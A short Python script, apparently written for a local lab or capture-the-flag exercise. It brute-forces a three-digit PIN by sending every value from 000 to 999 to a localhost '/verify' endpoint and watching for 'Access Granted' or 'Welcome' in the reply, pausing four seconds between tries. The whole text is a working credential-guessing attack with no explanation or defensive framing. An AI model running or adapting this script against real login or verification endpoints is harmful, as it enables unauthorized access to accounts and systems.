import requests
import time

url = 'http://localhost:8888/verify'

for pin in range(1000):
    pin_str = str(pin).zfill(3)
    print(f"Trying PIN: {pin_str}")

    try:
        response = requests.post(url, data={'magicNumber': pin_str})
        
        # Check for success keyword
        if "Access Granted" in response.text or "Welcome" in response.text:
            print(f"[✓] PIN Found: {pin_str}")
            break

    except Exception as e:
        print(f"Error: {e}")

    time.sleep(4)

